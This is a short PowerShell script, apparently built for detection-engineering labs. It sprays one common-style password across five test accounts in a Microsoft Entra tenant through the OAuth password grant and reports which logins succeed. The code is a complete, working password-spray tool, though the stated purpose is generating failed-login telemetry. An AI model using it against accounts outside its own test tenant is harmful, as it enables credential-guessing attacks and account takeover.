# Invoke-PasswordSpray.ps1
# LAB USE ONLY - sprays a single password across your own test accounts to
# generate failed sign-in telemetry for detection engineering. Own tenant only.

$tenantId = "bd18d4de-7ecc-4577-a9a1-37e6b43b380f"
$sprayPassword = "Autumn2026!"   # a plausible-but-wrong common password

$targets = @(
    "ada@jeffreylpfyahoo.onmicrosoft.com",
    "grace@jeffreylpfyahoo.onmicrosoft.com",
    "testuser1@jeffreylpfyahoo.onmicrosoft.com",
    "testuser2@jeffreylpfyahoo.onmicrosoft.com",
    "testuser3@jeffreylpfyahoo.onmicrosoft.com"
)

foreach ($user in $targets) {
    $body = @{
        client_id  = "1b730954-1685-4b74-9bfd-dac224a7b894"  # well-known Graph PowerShell client
        scope      = "https://graph.microsoft.com/.default"
        username   = $user
        password   = $sprayPassword
        grant_type = "password"
    }
    try {
        Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" -Body $body -ErrorAction Stop | Out-Null
        Write-Host "SUCCESS (unexpected): $user" -ForegroundColor Yellow
    }
    catch {
        Write-Host "Failed logon attempt: $user" -ForegroundColor Green
    }
    Start-Sleep -Seconds 2
}